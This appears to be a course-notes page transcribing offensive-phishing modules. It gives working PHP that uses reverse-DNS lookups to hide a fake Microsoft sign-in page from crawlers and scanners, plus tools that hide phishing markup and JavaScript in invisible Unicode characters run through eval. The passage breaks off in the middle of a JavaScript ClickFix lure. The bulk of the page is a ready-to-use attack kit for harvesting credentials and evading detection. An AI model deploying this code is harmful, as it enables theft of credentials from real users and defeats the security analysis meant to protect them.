---
layout: cyber
section: phishing
title: "Bypass de MFA e Ataques Avançados"
---

# 09. Bypass de MFA e Ataques Avançados

## Device Code, Evilginx e Consent Grant: Quando a Senha Não Basta

Esta seção cobre técnicas avançadas: anti-análise via DNS reverso e encoding invisível, bypass de MFA via proxy invisível (Flask e Cloudflare Workers), proteção do Evilginx via Caddy, phishing via Device Code Microsoft/GitHub e Illicit Consent Grant para roubo de tokens OAuth sem capturas de credenciais.

Os módulos a seguir foram transcritos do curso MalDev Academy - Offensive Phishing Operations Extra (Novos Módulos 11-20).

---

# Novo Módulo 11 — Anti-Análise Via Consulta DNS Reverso

Novo Módulo 11 — Anti-Análise Via Consulta DNS Reverso

- # Novo Módulo 11 — Anti-Análise Via Consulta DNS Reverso

# Disclaimer
# Module 11 - Anti-Analysis Via Reverse DNS Query

## Introduction
Previously in the course, we examined how various properties of an IP address such as geolocation, service provider, and ASN can be used to strengthen IP address restrictions. In this module, we’ll explore a different technique for extracting additional information from an IP address: using DNS `PTR` records. A `PTR` record, also known as a reverse DNS lookup, maps an IP address back to a domain name. This is the opposite of a typical `A` record, which maps a domain name to an IP address.By performing a DNS `PTR` lookup on clients accessing our phishing website, we can identify whether the source IP resolves to a hostname that is typically associated with crawlers, bots, or scanning infrastructure, providing an additional layer of filtering.
## Reverse DNS PTR Record Format (IPv4)
`PTR` records must be managed at the level where you have control over the IP’s reverse DNS zone, which is typically possible with a VPS or dedicated server. On shared hosting, `PTR` changes are usually restricted by the provider, since a single IP serves many customers. If you have the domain `maldev.com` with the IP address `1.2.3.4`, the PTR entry appears as follows:
```
4.3.2.1.in-addr.arpa. IN PTR maldev.com.

```
The IP address is reversed and appended with `.in-addr.arpa` because reverse DNS lookups are handled within the `.arpa` domain, which is reserved for internet infrastructure.
## Reverse DNS PTR Record Format (IPv6)
The previous example applies to domain names with IPv4 addresses. For `PTR` records involving IPv6, the process is slightly different. The full IPv6 address is first expanded, the colons are removed, split and reversed, and then appended with `.ip6.arpa`. For example, if `maldev.com` had the IPv6 address `2a01:4f8:c2c:1234::1`, then the steps below are followed:
The IP address is expanded to `2a01:04f8:0c2c:1234:0000:0000:0000:0001`.

- The colons are removed `2a0104f80c2c12340000000000000001`

- Reversed and split `1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.4.3.2.1.c.2.c.0.8.f.4.0.1.0.a.2`

- Finally, append `.ip6.arpa`, resulting in `1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.4.3.2.1.c.2.c.0.8.f.4.0.1.0.a.2.ip6.arpa`.

```
1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.4.3.2.1.c.2.c.0.8.f.4.0.1.0.a.2.ip6.arpa. IN PTR maldev.com.

```

## Reverse DNS Via Command-Line Tools
We can use standard DNS lookup tools to perform reverse DNS lookups. Typical examples include `nslookup`, `dig`, and `host`, each demonstrated below with how to perform a reverse DNS lookup.

```
nslookup 1.1.1.1
# Also valid:
# nslookup -type=PTR 1.1.1.1

dig -x 1.1.1.1
# Also valid:
# dig PTR 1.1.1.1.in-addr.arpa

host 1.1.1.1
# Also valid:
# host -t PTR 1.1.1.1

```
In the image below, `nslookup` is used to perform reverse lookups on three IP addresses, two of which are IPv4 and one is IPv6. The example IP addresses shown in the image below map to Vultr, Cloudflare, and Facebook. Legitimate clients would typically map to residential internet providers or enterprise networks, so when an IP address resolves to cloud hosting infrastructure, it often indicates automated tools or bots.

On the other hand, a client with a residential IP address is more likely to be legitimate. In the example below, the reverse DNS lookup reveals a hostname associated with Verizon, indicating that the IP likely belongs to a residential customer.

## Implementation
The next step will be to implement the reverse DNS lookup for every client accessing our website and analyzing the associated hostname, if there even is one. The implementation will be as follows:

- Select a random DNS resolver from a list of public nameservers. This is to avoid overwhelming a single nameserver and being rate limited.

- Retrieve the client's IP address, check if it's IPv4 or IPv6, and convert it into the correct reverse format.

- Perform a reverse DNS query using the selected resolver to obtain the hostname.

- Check the resulting hostname against a list of known bots keywords.

- If a match is found, return an HTTP 404 response and terminate the request.

- If no match is found, display the phishing content.

## Net_DNS2 PHP Library
To perform DNS lookups in PHP, we’ll use netdns2, a PHP library for native DNS query resolution. Begin by installing `composer` on your server, then use it to install the `netdns2` package.

```
sudo apt install composer
composer require pear/net_dns2

```
After completing the installation, use the script below to verify the library is working by resolving `example.com`'s DNS `A` records through Google’s public DNS server (`8.8.8.8`). The `new Net_DNS2_Resolver` will create a new resolver instance configured to perform DNS queries using the specified settings, such as custom nameservers, timeouts, and retry limits. Then the `query()` method is used to perform a DNS lookup for a given domain and record type (e.g., `A`, `MX`, `PTR`). It sends the query to the configured nameserver and returns the response containing any matching DNS records.

```
<?php
require __DIR__ . '/vendor/autoload.php';

$resolver = new Net_DNS2_Resolver(['nameservers' => ['8.8.8.8']]);
$response = $resolver->query('example.com', 'A');

foreach ($response->answer as $rr) {
    echo $rr . "<br>";
}
?>

```

## Rotating Nameservers
As outlined in the implementation steps, we will rotate through multiple public DNS servers to prevent overloading any single one. Additionally, we’ll configure the resolver to timeout after two seconds and attempt one retry if a query fails.

```
<?php

require __DIR__ . '/vendor/autoload.php';

$nameservers = ['1.1.1.1','8.8.8.8','8.8.4.4', '9.9.9.9', '1.0.0.1', '94.140.14.14'];

// Randomly select a NS from the array
$ns = $nameservers[array_rand($nameservers)];
echo "Nameserver used: " . $ns . "<br><br>"; // Print our nameserver

// Set the nameserver to the randomly selected one
$resolver = new Net_DNS2_Resolver(['nameservers' => [$ns],'timeout' => 2,'retry' => 1]);
$response = $resolver->query('example.com', 'A');

foreach ($response->answer as $rr) {
    echo $rr . "<br>";
}
?>

```
Notice how upon every refresh a randomly selected nameserver is selected.

The video can be found in folder: `./videos/random-ns.mov`

## Reverse DNS Querying IP Address
After randomly selecting a nameserver, we'll capture the client's IP address, determine whether it's IPv4 or IPv6, and convert it to the appropriate reverse DNS format. After conversion, we’ll perform a reverse DNS lookup to retrieve the hostname. When performing a reverse DNS query, `netdns2` returns an array of answer records within the `answer` property. Each element in this array is an object representing a DNS record. You can access the resolved hostname using the `ptrdname` property of the first element (e.g. `$response->answer[0]->ptrdname`). Finally, if no `PTR` record is found, we’ll use the IP address as the hostname as a fallback.

```
<?php

require __DIR__ . '/vendor/autoload.php';

$nameservers = ['1.1.1.1','8.8.8.8','8.8.4.4', '9.9.9.9', '1.0.0.1', '94.140.14.14'];
$client_ip = $_SERVER['REMOTE_ADDR'];

$ns = $nameservers[array_rand($nameservers)];
$r = new Net_DNS2_Resolver(['nameservers' => [$ns],'timeout' => 2,'retry' => 1]);

// Check if the IP is ipv4 or ipv6
// and set it into its correct format
if (filter_var($client_ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
    $hex = bin2hex(inet_pton($client_ip));
    $rev = implode('.', array_reverse(str_split($hex))) . '.ip6.arpa';
} else {
    $rev = implode('.', array_reverse(explode('.', $client_ip))) . '.in-addr.arpa';
}

// Try to perform a reverse DNS query
// If there's no PTR record then just print the IP address
try {
    $resp = $r->query($rev, 'PTR');
    $hostname = strtolower($resp->answer[0]->ptrdname);
} catch (Exception $e) {
    $hostname = $client_ip;
}

echo "Resolver used: " . $ns . "<br>" . "Hostname: " . $hostname;

?>

```

## Blacklisting Hostnames
The final functionality to implement is a blacklist check: we’ll define an array of keywords and scan the client's reverse DNS hostname for any matches. If a match is found, the server will return an HTTP 404 page to block access. In the code snippet below we create the `$bots` array which defines `amazonaws`, `google` and `microsoft` as blacklisted keywords.

```
<?php

require __DIR__ . '/vendor/autoload.php';

$nameservers = ['1.1.1.1','8.8.8.8','8.8.4.4', '9.9.9.9', '1.0.0.1', '94.140.14.14'];
$bots = ['amazonaws', 'google', 'microsoft'];

$client_ip = $_SERVER['REMOTE_ADDR'];
$ns = $nameservers[array_rand($nameservers)];

$r = new Net_DNS2_Resolver(['nameservers' => [$ns],'timeout' => 2,'retry' => 1]);

if (filter_var($client_ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
    $hex = bin2hex(inet_pton($client_ip));
    $rev = implode('.', array_reverse(str_split($hex))) . '.ip6.arpa';
} else {
    $rev = implode('.', array_reverse(explode('.', $client_ip))) . '.in-addr.arpa';
}

try {
    $resp = $r->query($rev, 'PTR');
    $hostname = strtolower($resp->answer[0]->ptrdname);
} catch (Exception $e) {
    $hostname = $client_ip;
}

foreach ($bots as $b) {
    if (strpos($hostname, $b) !== false) {
        header('HTTP/1.1 404 Not Found');
        echo "404 Not found";
        exit();
    }
}

```

## Complete Code
The complete code is shown below, where a reverse DNS query is performed on the client's IP address and the hostname is checked against a list of blacklisted keywords. If the user is blacklisted, an HTTP 404 page is shown, otherwise a Microsoft phishing page is shown.

```
<?php

require __DIR__ . '/vendor/autoload.php';

$nameservers = ['1.1.1.1','8.8.8.8','8.8.4.4', '9.9.9.9', '1.0.0.1', '94.140.14.14'];
$bots = ['amazonaws', 'google', 'microsoft'];

$client_ip = $_SERVER['REMOTE_ADDR'];
$ns = $nameservers[array_rand($nameservers)];

$r = new Net_DNS2_Resolver(['nameservers' => [$ns],'timeout' => 2,'retry' => 1]);

if (filter_var($client_ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
    $hex = bin2hex(inet_pton($client_ip));
    $rev = implode('.', array_reverse(str_split($hex))) . '.ip6.arpa';
} else {
    $rev = implode('.', array_reverse(explode('.', $client_ip))) . '.in-addr.arpa';
}

try {
    $resp = $r->query($rev, 'PTR');
    $hostname = strtolower($resp->answer[0]->ptrdname);
} catch (Exception $e) {
    $hostname = $client_ip;
}

foreach ($bots as $b) {
    if (strpos($hostname, $b) !== false) {
        header('HTTP/1.1 404 Not Found');
        echo "404 Not found";
        exit();
    }
}

// No match found, show the phishing page
echo <<<PHISH
<html>
<head>
    <title>Microsoft Sign in</title>
    <style>
      :root{
        --brand-blue:#0078d4;
        --brand-blue-hover:#006cbe;
        --field-border:#a6a6a6;
        --card-bg:rgba(255,255,255,.95);
      }
      html,body{
        height:100%;
        margin:0;
        font-family:"Segoe UI", Helvetica, Arial, sans-serif;
        background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgA...") center/cover no-repeat fixed; /* IMAGE SNIPPED */
        display:flex;
        justify-content:center;
        align-items:center;
      }
      .card{
        width:360px;
        padding:40px 48px 48px;
        background:var(--card-bg);
        box-shadow:0 10px 32px rgba(0,0,0,.18);
        border-radius:8px;
        text-align:center;
      }
      .card img{width:40px;margin-bottom:28px;}     
      .title{font-size:28px;font-weight:600;margin:0 0 24px;}
      .field{
        width:100%;
        font-size:16px;
        padding:12px 14px;
        margin-bottom:18px;
        border:1px solid var(--field-border);
        border-radius:4px;
        box-sizing:border-box;
      }
      .field:focus{
        outline:none;
        border-color:var(--brand-blue);
        box-shadow:0 0 0 2px rgba(0,120,212,.2);
      }
      .btn{
        width:100%;
        font-size:16px;
        font-weight:600;
        padding:14px 0;
        border:none;
        border-radius:4px;
        color:#fff;
        background:var(--brand-blue);
        cursor:pointer;
      }
      .btn:hover{background:var(--brand-blue-hover);}
      .btn:active{background:#005ba1;}
    
      .links{margin-top:20px;font-size:14px;}
      .links a{
        color:var(--brand-blue);
        text-decoration:none;
      }
      .links a:hover{text-decoration:underline;}
    </style>
    </head>
    <body>
      <form class="card" action="login.php" method="POST">
        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAhFBMVEXz8/PzUyWBvAYFpvD/ugjz9fb19Pbz+fr39fr69vPy9foAofD/tgDzRQB9ugAAo/Df6dCv0Xjz2dPzTBfzl4PznImz04CAx/H60oHS5vJ5xPH60Hn16dIAnvDz7u3z4t7n7dzzNADzkXurz3BwtQDzvrLM36zf6/Os2PL336z07d/7z3RN8WfWAAABg0lEQVR4nO3cyVLCYBCFURwCkXlygDBFUBTf//3cSGIVf5WrDi7O9wJdp3p/Wy1JkvSrLLzqVDu8FHAzjW57JrZ34+hSH5yWg9jK187PrXx/GMZ2GF9+MZsObmKbzSvhZHgb25CQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCwUWE5i21QC/fB86Xp/dLt/DG4t/MGbf7+FNxkl9jZzTrR1TvCeXjJIWFJkv7uIbzqVDe8LAE8Lp+D+zgTu5/FS2zFKUFcrEex9ZaV8Ksf3Sol7N3FNqqFRf8+NkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQsJmhetebOtr75dmi+iO1anTKrrNJbDRsvCuDJQk6Z/1DSzvYqEfRCNJAAAAAElFTkSuQmCC">
        <h2 class="title">Sign in</h2>
        <input class="field" type="text" placeholder="Email, phone, or Skype" required>
        <input class="field" type="password" placeholder="Password" required>
        <button class="btn" type="submit">Sign in</button>
        <div class="links">
          <a href="#">Can't access your account?</a>
        </div>
      </form>
</body>
<html>
PHISH;

```
In the image below, we access the website using a legitimate client which displays the Microsoft phishing page and then using Geopeeker which uses AWS to access our website. Geopeeker's screenshots show that the website returns a 404 page instead of the phishing page.

## Conclusion
Using reverse DNS lookups can be an effective method for identifying and blocking bots and crawlers by revealing whether an IP address belongs to a data center or a residential ISP. However, the technique is not foolproof because some vendors may use residential proxies to mask their true origin and appear more legitimate.

## Objectives
Perform reverse DNS analysis on users accessing your phishing website and log the results

Analyze the results to find keywords to use for blacklisting

Perform reverse DNS analysis and blacklist bot keywords

Perform reverse DNS analysis and whitelist a set of keywords. Is this method practical?


---

# Novo Módulo 12 — Anti-Análise Via Encoding Invisível (Unicode)

Novo Módulo 12 — Anti-Análise Via Encoding Invisível (Unicode)

- # Novo Módulo 12 — Anti-Análise Via Encoding Invisível (Unicode)

# Disclaimer
# Module 12 - Anti-Analysis Via Invisible Encoding

## Introduction
Throughout the course we've demonstrated several frontend obfuscation and encryption methods to reduce signature detection and throttle manual analysis attempts on our phishing websites. In this module, we will demonstrate two obfuscation methods that utilize Unicode whitespace characters.
## Method 1: Zero-Width Obfuscation
The first invisible obfuscation method we will discuss is Zero-Width Obfuscation, where each ASCII character is iterated over, converted into its 16-bit binary representation, and then encoded using zero-width Unicode characters. In this method:
`0` is represented by `\u200B` (Zero Width Space),

- `1` is represented by `\u200C` (Zero Width Non-Joiner)

- A delimiter `\u200D` (Zero Width Joiner) is added at the end of each character’s binary sequence.

To clarify how the transformation is made, we'll demonstrate an example by obfuscating the word "Maldev". First, convert each letter to its ASCII value and then to binary. Since binary strings can be shorter than 16 bits, pad them with leading zeros to ensure each character is represented using 16-bit binary encoding.

| Char 
| ASCII 
| Binary (Before Padding) 
| Binary (16-bit Padded) 
|

| M 
| 77 
| 1001101 
| 0000000001001101 
|

| a 
| 97 
| 1100001 
| 0000000001100001 
|

| l 
| 108 
| 1101100 
| 0000000001101100 
|

| d 
| 100 
| 1100100 
| 0000000001100100 
|

| e 
| 101 
| 1100101 
| 0000000001100101 
|

| v 
| 118 
| 1110110 
| 0000000001110110 
|

Take the padded 16-bit binary string and replace the `0`s with `\u200B`, the `1`s with `\u200C`, and append `\u200D` at the end to mark the end of each character.

- M - `\u200B\u200B\u200B\u200B\u200B\u200B\u200B\u200B\u200B\u200C\u200B\u200C\u200C\u200B\u200C\u200D`

- a - `\u200B\u200B\u200B\u200B\u200B\u200B\u200B\u200B\u200C\u200C\u200B\u200B\u200B\u200B\u200C\u200D`

- l - `\u200B\u200B\u200B\u200B\u200B\u200B\u200B\u200B\u200C\u200C\u200B\u200C\u200C\u200B\u200B\u200D`

- d - `\u200B\u200B\u200B\u200B\u200B\u200B\u200B\u200B\u200C\u200C\u200B\u200C\u200B\u200B\u200B\u200D`

- e - `\u200B\u200B\u200B\u200B\u200B\u200B\u200B\u200B\u200C\u200C\u200B\u200C\u200B\u200B\u200C\u200D`

- v - `\u200B\u200B\u200B\u200B\u200B\u200B\u200B\u200B\u200C\u200C\u200C\u200B\u200C\u200C\u200B\u200D`

### Zero-Width Encoder
To carry out the character transformation described above, we use a custom function called `invisibleEncoding`. This function takes the phishing content as input, processes it one character at a time, converts each character to its 16-bit binary representation, replaces each bit with its corresponding zero-width Unicode character, and appends the delimiter to mark the end of each encoded character.

Additionally, since copying whitespace characters can be difficult (since they are not visible) we'll use the HTML document below which prompts for the phishing content, obfuscates it, and copies the results directly to the clipboard.

```
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Zero-Width Encoder</title>
</head>
<body>

<script>
function invisibleEncoding(input) {
  let result = "";
  for (let i = 0; i < input.length; i++) {
    const code = input.charCodeAt(i);
    const binary = code.toString(2).padStart(16, '0');
    for (const bit of binary) {
      result += (bit === '0') ? '\u200B' : '\u200C';
    }
    result += '\u200D'; 
  }
  return result;
}

document.addEventListener('DOMContentLoaded', function() {
  const originalHTML = prompt("Enter the phishing content to obfuscate:");
  if (!originalHTML) {
    alert("No input provided. Exiting.");
    return;
  }

  // Convert phishing content into invisible zero-width text
  const invisible = invisibleEncoding(originalHTML);

  const btn = document.createElement('button');
  btn.textContent = "Copy Obfuscated Content to Clipboard";
  btn.onclick = async function() {
    try {
      await navigator.clipboard.writeText(invisible);
      alert("Obfuscated zero-width text copied to clipboard!");
    } catch (err) {
      console.error("Clipboard write failed:", err);
      alert("Failed to copy to clipboard. Check console for details.");
    }
  };
  document.body.appendChild(btn);
});
</script>

</body>
</html>

```

### Zero-Width Decoder
The Decoder will be responsible for reversing the actions performed by the zero-width Encoder and displaying the phishing content. Specifically, the `invisibleDecoding` function takes the obfuscated phishing content, splits it by the zero-width joiner (`\u200D`), decodes each binary chunk and reconstructs the original string from the resulting character codes. Finally, it uses `document.write` to write the original phishing content dynamically.

The obfuscated phishing content retrieved from the Encoder should be placed inside the `INVISIBLE_CONTENT`.

```
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Zero-Width Decoder</title>
</head>
<body style="display:none;">

<script>
function invisibleDecoding(encrypted) {
  const chunks = encrypted.split('\u200D');
  let output = "";

  for (const chunk of chunks) {
    if (!chunk) continue;
    let bits = "";
    for (const c of chunk) {
      // \u200B => '0'
      if (c === '\u200B') bits += '0';
      // \u200C => '1'
      if (c === '\u200C') bits += '1';
    }
    const code = parseInt(bits, 2);
    output += String.fromCharCode(code);
  }
  return output;
}

// PLACE OBFUSCATED CONTENT HERE
var INVISIBLE_CONTENT = "";

window.addEventListener('DOMContentLoaded', function() {
  var decrypted = invisibleDecoding(INVISIBLE_CONTENT);
  document.write(decrypted);
});
</script>

</body>
</html>

```

### Demo
In the demo below, we obfuscate the WebDAV ClickFix phishing page from the previous module using zero-width obfuscation.

The video can be found in folder: `./videos/demo-1-unicode-whitespace.mov`

## Method 2: Hangul Filler Obfuscation
The second invisible obfuscation method we will discuss is Hangul Filler Obfuscation, which was originally demonstrated Martin Kleppe. This technique converts a JavaScript payload into a sequence of invisible characters by converting each ASCII character into its 8-bit binary form (for example, `A` becomes `01000001`). It maps `1`s to the Hangul Filler (`\u3164`) and `0`s to the Halfwidth Hangul Filler (`\uFFA0`). The result is a completely invisible string that represents executable code. Unlike zero-width obfuscation, no delimiter is needed because each ASCII character is encoded as exactly 8 bits, and the decoder processes the invisible characters in 8-bit chunks to reconstruct the original text.

To demonstrate how this transformation works, we’ll obfuscate the string "Maldev" by converting each character into binary and then mapping each bit to the appropriate invisible character.

| Char 
| ASCII 
| 8-bit Binary 
|

| M 
| 77 
| 01001101 
|

| a 
| 97 
| 01100001 
|

| l 
| 108 
| 01101100 
|

| d 
| 100 
| 01100100 
|

| e 
| 101 
| 01100101 
|

| v 
| 118 
| 01110110 
|

Next, convert the binary values into invisible character sequences:

- M – `\uFFA0\u3164\uFFA0\uFFA0\u3164\u3164\uFFA0\u3164`

- a – `\uFFA0\u3164\u3164\uFFA0\uFFA0\uFFA0\uFFA0\u3164`

- l – `\uFFA0\u3164\u3164\uFFA0\u3164\u3164\uFFA0\uFFA0`

- d – `\uFFA0\u3164\u3164\uFFA0\uFFA0\u3164\uFFA0\uFFA0`

- e – `\uFFA0\u3164\u3164\uFFA0\uFFA0\u3164\uFFA0\u3164`

- v – `\uFFA0\u3164\u3164\u3164\uFFA0\u3164\u3164\uFFA0`

The `hangulFillerEncoder` function takes a JavaScript payload and converts it into a sequence of invisible Unicode characters by applying the aforementioned transformation.

```
const zeroChar = "\uFFA0";
const oneChar = "\u3164";

function hangulFillerEncoder(input) {
  let encoded = "";
  for (let i = 0; i < input.length; i++) {
    const binary = input.charCodeAt(i).toString(2).padStart(8, "0");
    for (const bit of binary) {
      encoded += bit === "1" ? oneChar : zeroChar;
    }
  }
  return encoded;
}

/////// Testing the encoder ///////
// Encode payload
const payload = 'Maldev';
const encodedResult = hangulFillerEncoder(payload);

// This will not show anything
console.log(encodedResult);

// Convert each character to U+XXXX format
const unicodeCodePoints = [...encodedResult].map(char => {
  const hex = char.charCodeAt(0).toString(16).toUpperCase().padStart(4, '0');
  return `U+${hex}`;
});

// Group them by 8 characters on each line
for (let i = 0; i < unicodeCodePoints.length; i += 8) {
  const row = unicodeCodePoints.slice(i, i + 8).join(' ');
  console.log(row);
}

```

### Proxy Objects
At this stage we have the obfuscated content, to use it in our phishing website, we will need to build the Hangul Filler decoder. However, prior to discussing the decoder, we need to first understand JavaScript Proxy Objects and get traps.

A Proxy is a JavaScript object that lets you customize or override how basic operations work on another object. This includes actions like reading a property, setting a value, checking if a property exists, or calling a function. Instead of directly interacting with the original object, the Proxy can run your own code whenever one of these actions happens.

To better understand proxies, we can show how the code behaves both with and without using a proxy. The JavaScript snippet has the object `obj` with a property called `course` that holds a string value "Offensive Phishing Operations". If we use `console.log` to print the value, it simply returns the value stored in the object. Nothing special happens when you access the property.

```
const obj = {
  course: "Offensive Phishing Operations"
};

console.log(obj.course); // This prints: Offensive Phishing Operations

```
We can use a Proxy object to intercept and customize what happens when someone interacts with another object, such as reading our `obj.course` property. In the snippet below, the `get` function, also called a get trap, runs whenever a property is accessed. The `get` function receives two arguments:

- `target` - The original object the Proxy is wrapping. In this case, it is just an empty object.

- `property` - The name of the property being accessed. If you try to access `obj.course`, the value of property will be "course".

Instead of returning a real value from the object, the Proxy prints a message and gives back the text "Access blocked". This shows how you can control what happens whenever a property is accessed.

```
const obj = new Proxy({}, {
  get: (target, property) => {
    console.log(`Someone tried to access: ${property}`);
    return "Access blocked";
  }
});

// This prints "Someone tried to access: course"
// Then prints "Access blocked"
console.log(obj.course);

```

### Hangul Filler Decoder
The Hangul Filler Decoder starts by creating a Proxy with a get trap and then immediately accesses a property on that proxy because of the dot followed by an invisible name. That property name, called `n`, is the string you place between the comments `// ENCODED JAVASCRIPT STARTS HERE` and `// ENCODED JAVASCRIPT ENDS HERE`. Although it looks empty, it actually contains the encoded results from our Hangul Filler Encoder.

Inside the getter, each encoded character is checked to see if it comes before `U+FFA0`. If it does, it's the regular Hangul Filler and becomes a 1. If it's equal to `U+FFA0`, it's the Halfwidth Hangul Filler and becomes a 0. This creates a string of 1s and 0s, which is split into chunks of eight. Each chunk is turned into a byte, then into an ASCII letter. The resulting text is passed to `eval`, so the hidden code inside `n` runs right away, even though the line that triggers it looks completely empty.

```
// https://aem1k.com/invisible/encoder/
// use a Proxy
new Proxy({}, {
  // property trap
  get: (_, n) => 
    // execute code
    eval([...n]
      // convert to 0 and 1
      .map(n => +("ﾠ" > n)).join(``)
      // get byte sequences
      .replace(/.{8}/g, n => 
        // convert binary to string
        String.fromCharCode(+("0b" + n))
      )
    )
}).
// ENCODED JAVASCRIPT STARTS HERE

// ENCODED JAVASCRIPT ENDS HERE

```
To further clarify what the decoder is doing, we break the explanation down into simple steps:

1.A `Proxy` object is created with a custom `get` trap to intercept all property access. The `get` function takes two parameters: `_`, which is the target object (not used here), and `n`, which is the name of the property being accessed. In this case, `n` is our encoded results and it's placed between the `// ENCODED JAVASCRIPT STARTS HERE` and `// ENCODED JAVASCRIPT ENDS HERE` comments. Although it looks empty, this string is what triggers the hidden code execution.

```
new Proxy({}, {
    get: (_, n) => ...
});

```
2.Each encoded character in `n` is compared to a Halfwidth Hangul Filler (`ﾠ`, Unicode U+FFA0). If the character is smaller, meaning it is a regular Hangul Filler, the comparison returns true, which becomes 1. If the character is Halfwidth Hangul Filler, the comparison returns false, which becomes 0. This process builds a binary string from the invisible characters.

```
// The empty space between the quotes is a Halfwidth Hangul Filler
// so it's actually: "U+FFA0" > n
[...n].map(n => +("ﾠ" > n)).join('')

```
4.The binary string is split into 8-bit chunks. Each chunk is treated as a binary number, converted to a decimal value, and then turned into a character using `String.fromCharCode`.

```
.replace(/.{8}/g, n =>
    String.fromCharCode(+("0b" + n))
)

```
5.The decoded characters are executed via `eval`.

```
eval( ... )

```

### Hangul Filler Obfuscation: Complete Code
The complete implementation of the Hangul Filler Obfuscation method is shown below. When the HTML document is opened, a prompt appears requesting the JavaScript payload to encode. Once the payload is entered, the `hangulFillerEncoder` function encodes the payload. A button is also displayed that, when clicked, concatenates the encoded JavaScript with the decoder stub and copies the result to the clipboard.

```
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Hangul Filler Encoder</title>
</head>
<body>

<script>
const zeroChar = "\uFFA0";
const oneChar = "\u3164";

function hangulFillerEncoder(input) {
  let encoded = "";
  for (let i = 0; i < input.length; i++) {
    const binary = input.charCodeAt(i).toString(2).padStart(8, "0");
    for (const bit of binary) {
      encoded += bit === "1" ? oneChar : zeroChar;
    }
  }
  return encoded;
}

document.addEventListener('DOMContentLoaded', function () {
  const jsCode = prompt("Enter the JavaScript code to obfuscate:");
  if (!jsCode) {
    alert("No input provided. Exiting.");
    return;
  }

  const encoded = hangulFillerEncoder(jsCode);
const finalPayload=`new Proxy({},{get:(_,n)=>eval([...n].map(n=>+('ﾠ'>n)).join\`\`.replace(/.{8}/g,n=>String.fromCharCode(+('0b'+n))))}).
// ENCODED JAVASCRIPT STARTS HERE
${encoded}
// ENCODED JAVASCRIPT ENDS HERE`;

  const btn = document.createElement('button');
  btn.textContent = "Copy Invisible JS to Clipboard";
  btn.onclick = async function () {
    try {
      await navigator.clipboard.writeText(finalPayload);
      alert("Invisible JavaScript copied to clipboard!");
    } catch (err) {
      console.error("Clipboard write failed:", err);
      alert("Failed to copy to clipboard. See console for error.");
    }
  };

  document.body.appendChild(btn);
});
</script>

</body>
</html>

```
Once the contents are copied to the clipboard, paste them in a separate HTML document inside `<script>` tags.

```
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Hangul Filler Decoder</title>
  </head>
  <body>
    <script>
      // Paste clipboard contents here
    </script>
  </body>
</html>

```

### JavaScript Payload
The final component is the JavaScript payload that will be used. Unlike the zero-width HTML obfuscation method, this approach requires us to obfuscate actual JavaScript code. For this reason, our payload will be the same WebDAV ClickFix page, but rewritten in JavaScript form.

```
const style = document.createElement("style");
style.textContent = `
  body {
    font-family: "Segoe UI", sans-serif;
    background: #f2f2f2;
    margin: 0;
    padding: 40px;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh
  }
  .card {
    background: #fff;
    width: 450px;
    padding: 30px;
    box-shadow: 0 0 10px rgba(0, 0, 0, .1);
    border-radius: 8px;
    text-align: center;
    position: relative
  }
  .icon {
    width: 40px;
    height: 40px;
    margin: 0 auto 10px
  }
  .icon svg {
    width: 100%;
    height: 100%;
    fill: #0078d4
  }
  .file-box {
    border: 1px solid #ccc;
    border-radius: 6px;
    padding: 12px;
    margin: 20px 0;
    display: flex;
    align-items: center;
    justify-content: center
  }
  .file-box img {
    width: 24px;
    margin-right: 10px
  }
  .small-note {
    color: #666;
    font-size: 13px;
    margin-top: 8px
  }
  #dlFile {
    margin-top: 20px;
    background: #0078d4;
    color: #fff;
    border: none;
    padding: 12px 20px;
    border-radius: 4px;
    font-size: 16px;
    cursor: pointer
  }
  .overlay {
    position: fixed;
    inset: 0;
    background: rgba(0, 0, 0, .45);
    z-index: 1000
  }
  .modal {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: #fff;
    width: 580px;
    max-width: 90vw;
    padding: 50px;
    border-radius: 10px;
    box-shadow: 0 4px 16px rgba(0, 0, 0, .25);
    z-index: 1001
  }
  .hidden {
    display: none
  }
  .modal-content h2 {
    margin-top: 0;
    font-size: 20px;
    text-align: center;
    color: #333
  }
  #modal-description {
    font-size: 14px;
    color: #0f0f0f;
  }
  .close {
    position: absolute;
    top: 16px;
    right: 20px;
    font-size: 24px;
    font-weight: 700;
    color: #666;
    cursor: pointer
  }
  .copyable {
    background: #f5f5f5;
    border-radius: 4px;
    padding: 2px 6px;
    user-select: all;
    position: relative;
    display: inline-block;
  }
  .copyable::after {
    content: "Copy";
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: rgba(0,0,0,0.7);
    color: #fff;
    display: flex;
    align-items: center;
    justify-content: center;
    opacity: 0;
    transition: opacity 0.2s;
    border-radius: 4px;
  }
  .copyable:hover::after {
    opacity: 1;
  }
  .copyable.clicked::after {
    content: "Copied";
    opacity: 1;
  }
  .win-icon {
    font-size: 14px;
    vertical-align: -1px
  }
  ol {
    padding-left: 20px;
    margin: 1em 0
  }
  li {
    margin-bottom: 10px;
    font-size: 14px;
  }
  kbd {
    background: #eee;
    border-radius: 3px;
    border: 1px solid #b4b4b4;
    padding: 2px 4px;
    font-size: .9em;
    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif
  }
`;
document.head.appendChild(style);

document.body.innerHTML = `
  <div class="card">
    <div class="icon">
